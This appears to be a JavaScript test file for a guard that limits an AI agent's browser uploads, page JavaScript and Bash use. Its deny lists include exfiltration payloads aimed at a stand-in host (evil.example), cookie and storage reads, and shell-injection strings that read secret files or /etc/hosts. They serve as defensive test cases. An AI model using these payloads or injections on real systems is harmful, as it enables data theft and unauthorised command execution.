// The browser guard's opt-in capabilities (ADR-0073): uploads from the run's
// fixtures only, read-only page JavaScript, and Bash for exactly dev-inspect.
import { describe, test } from "node:test";
import assert from "node:assert/strict";
import { mkdirSync, mkdtempSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import {
  ALWAYS_DENY,
  RUNNER_TOOLS,
  allowedToolsArg,
  alwaysDeny,
  bashVerdict,
  buildGuardSettings,
  decidePre,
  jsVerdict,
  runnerTools,
  sessionToolsArg,
  uploadVerdict,
  validateConfig,
} from "../lib/browser-guard.mjs";

const DEVICE = "9796912b-8977-4d74-9c08-d9bb283b9496";
const PREVIEW = "https://drafto-dc66i71t0-jakubanderwalds-projects.vercel.app";
const OWN_TAB = 1264169916;
const T = (n) => `mcp__claude-in-chrome__${n}`;
const state = { selected: true, tabs: { [OWN_TAB]: `${PREVIEW}/notes` } };

function fixturesDir() {
  const root = mkdtempSync(join(tmpdir(), "guard-fixtures-"));
  const dir = join(root, "fixtures");
  mkdirSync(dir);
  writeFileSync(join(dir, "small.jpg"), "x");
  writeFileSync(join(root, "outside.jpg"), "x");
  symlinkSync(join(root, "outside.jpg"), join(dir, "link.jpg"));
  mkdirSync(join(dir, "folder"));
  return { root, dir };
}

const base = {
  deviceId: DEVICE,
  allowOrigins: [PREVIEW],
  logDir: "/x/log",
  stateDir: "/x/state",
  evidenceDir: "/x/evidence",
};

describe("capabilities in the config", () => {
  test("are off by default: the lists are the reviewed ones", () => {
    assert.deepEqual(runnerTools(), [...RUNNER_TOOLS]);
    assert.deepEqual(alwaysDeny(), [...ALWAYS_DENY]);
    assert.equal(sessionToolsArg(), "");
    assert.ok(!allowedToolsArg().includes("Bash"));
    assert.equal(validateConfig(base).capabilities, undefined);
  });

  test("each one adds only its own tool, and upload_image stays denied", () => {
    const all = { capabilities: ["uploads", "js", "inspect"] };
    assert.deepEqual(runnerTools(all).slice(-2), ["file_upload", "javascript_tool"]);
    assert.ok(!alwaysDeny(all).includes("file_upload"));
    assert.ok(!alwaysDeny(all).includes("javascript_tool"));
    assert.ok(alwaysDeny(all).includes("upload_image"));
    assert.ok(alwaysDeny(all).includes("switch_browser"));
    assert.equal(sessionToolsArg(all), "Bash");
    assert.ok(allowedToolsArg(all).split(",").includes("Bash"));
    assert.deepEqual(runnerTools({ capabilities: ["js"] }).slice(-1), ["javascript_tool"]);
  });

  test("validateConfig refuses an unknown capability, and uploads without a fixtures dir", () => {
    assert.throws(() => validateConfig({ ...base, capabilities: ["shell"] }), /capabilities/);
    assert.throws(() => validateConfig({ ...base, capabilities: ["uploads"] }), /fixturesDir/);
    const c = validateConfig({
      ...base,
      capabilities: ["uploads", "js"],
      fixturesDir: "/r/fixtures",
    });
    assert.deepEqual(c.capabilities, ["uploads", "js"]);
    assert.equal(c.fixturesDir, "/r/fixtures");
  });

  test("the settings deny what stays off and hook Bash only with inspect", () => {
    const paths = { nodePath: "/n/node", guardPath: "/g/guard.mjs", configPath: "/c/cfg.json" };
    const plain = buildGuardSettings(paths);
    assert.deepEqual(plain.permissions.deny, ALWAYS_DENY.map(T));
    assert.equal(plain.hooks.PreToolUse.length, 1);
    const all = buildGuardSettings({
      ...paths,
      config: { capabilities: ["uploads", "js", "inspect"] },
    });
    assert.ok(!all.permissions.deny.includes(T("file_upload")));
    assert.ok(all.permissions.deny.includes(T("upload_image")));
    assert.deepEqual(
      all.hooks.PreToolUse.map((h) => h.matcher),
      ["mcp__claude-in-chrome__.*", "Bash"],
    );
    assert.match(all.hooks.PreToolUse[1].hooks[0].command, /hook pre .*\|\| exit 2$/);
  });
});

describe("file_upload", () => {
  test("is denied without the uploads capability", () => {
    const d = decidePre({
      tool: T("file_upload"),
      input: { tabId: OWN_TAB, paths: ["/x/small.jpg"], ref: "ref_1" },
      config: base,
      state,
    });
    assert.equal(d.allow, false);
  });

  test("takes only regular files inside the run's fixtures directory", () => {
    const { root, dir } = fixturesDir();
    const config = { ...base, capabilities: ["uploads"], fixturesDir: dir };
    const up = (paths) =>
      decidePre({
        tool: T("file_upload"),
        input: { tabId: OWN_TAB, paths, ref: "r" },
        config,
        state,
      });
    assert.equal(up([join(dir, "small.jpg")]).allow, true);
    for (const bad of [
      [join(root, "outside.jpg")],
      [join(dir, "link.jpg")],
      [join(dir, "folder")],
      [join(dir, "..", "outside.jpg")],
      [join(dir, "missing.jpg")],
      ["small.jpg"],
      [join(dir, "small.jpg"), "/etc/hosts"],
      [],
      "not-a-list",
    ]) {
      assert.equal(up(bad).allow, false, JSON.stringify(bad));
    }
  });

  test("needs a tab the session owns", () => {
    const { dir } = fixturesDir();
    const d = decidePre({
      tool: T("file_upload"),
      input: { tabId: 42, paths: [join(dir, "small.jpg")], ref: "r" },
      config: { ...base, capabilities: ["uploads"], fixturesDir: dir },
      state,
    });
    assert.equal(d.allow, false);
  });

  test("uploadVerdict refuses a run without a fixtures directory", () => {
    assert.equal(uploadVerdict({ paths: ["/a"] }, {}).ok, false);
  });
});

describe("javascript_tool", () => {
  const config = { ...base, capabilities: ["js"] };
  const js = (text) =>
    decidePre({
      tool: T("javascript_tool"),
      input: { tabId: OWN_TAB, text, action: "javascript_exec" },
      config,
      state,
    });

  test("is denied without the js capability", () => {
    const d = decidePre({
      tool: T("javascript_tool"),
      input: { tabId: OWN_TAB, text: "document.title" },
      config: base,
      state,
    });
    assert.equal(d.allow, false);
  });

  for (const code of [
    "document.querySelectorAll('.bn-error-text').length",
    "[...document.querySelectorAll('[data-content-type=image]')].length",
    "document.querySelector('a').href",
    "document.querySelector('a').href === '/notes'",
    "location.pathname === '/notebooks'",
    "location.href == 'x'",
    "await new Promise(r => setTimeout(r, 500)); document.title",
  ]) {
    test(`allows read-only ${JSON.stringify(code).slice(0, 60)}`, () => {
      assert.equal(js(code).allow, true, js(code).reason);
    });
  }

  for (const code of [
    "document.cookie",
    "fetch('https://evil.example/' + document.title)",
    "fetch('/api/notes').then(r => r.status)",
    "fetch('/\\\\evil.example/x')",
    "fetch('/api/notes/x', { method: 'DELETE' })",
    "const f = fetch; f('https://evil.example/x')",
    "new Request('/x')",
    "location.reload()",
    "fetch(`//evil.example`)",
    "fetch(url)",
    "new XMLHttpRequest()",
    "localStorage.getItem('sb')",
    "sessionStorage.length",
    "indexedDB.open('x')",
    "location.href = 'https://evil.example'",
    "location.assign('/x')",
    "location['href'] = 'x'",
    "history.pushState({}, '', '/x')",
    "window.open('/x')",
    "eval('1')",
    "new Function('return 1')",
    "setTimeout('alert(1)', 1)",
    "import('/x.js')",
    "new WebSocket('wss://x')",
    "navigator.sendBeacon('/x', 'y')",
    "parent.postMessage('x', '*')",
    "document.querySelector('img').src = 'https://evil.example/x'",
    "document.forms[0].action='https://evil.example'",
    "document.querySelector('img').setAttribute('src', 'https://evil.example/x')",
    "x".repeat(5000),
    "",
  ]) {
    test(`denies ${JSON.stringify(code).slice(0, 60)}`, () => {
      assert.equal(js(code).allow, false);
    });
  }

  test("never quotes the code in its reason", () => {
    const v = jsVerdict("document.cookie /* SECRET-MARKER */");
    assert.ok(!v.reason.includes("SECRET-MARKER"));
  });
});

describe("Bash (inspect)", () => {
  const config = { ...base, capabilities: ["inspect"] };
  const bash = (command) => decidePre({ tool: "Bash", input: { command }, config, state });

  for (const command of [
    "dev-inspect whoami",
    "dev-inspect rows attachments --note d5f8208d-cb04-4be0-8102-5f7a28df2ff7",
    "dev-inspect --as admin profile",
    "dev-inspect usage",
  ]) {
    test(`allows ${command}`, () => assert.equal(bash(command).allow, true));
  }

  for (const command of [
    "dev-inspect whoami; cat ~/drafto-secrets/x",
    "dev-inspect whoami && ls",
    "dev-inspect whoami | tee x",
    "dev-inspect whoami > /tmp/x",
    "dev-inspect $(cat x)",
    "dev-inspect `id`",
    "dev-inspect 'rows'",
    "dev-inspect rows *",
    "/abs/bin/dev-inspect whoami",
    "ls",
    "cat /etc/hosts",
    "dev-inspect\nls",
    " dev-inspect whoami",
  ]) {
    test(`denies ${JSON.stringify(command)}`, () => assert.equal(bash(command).allow, false));
  }

  test("is denied without the inspect capability", () => {
    assert.equal(
      decidePre({ tool: "Bash", input: { command: "dev-inspect whoami" }, config: base, state })
        .allow,
      false,
    );
  });

  test("bashVerdict never quotes the command", () => {
    assert.ok(!bashVerdict("cat SECRET-MARKER").reason.includes("SECRET-MARKER"));
  });
});
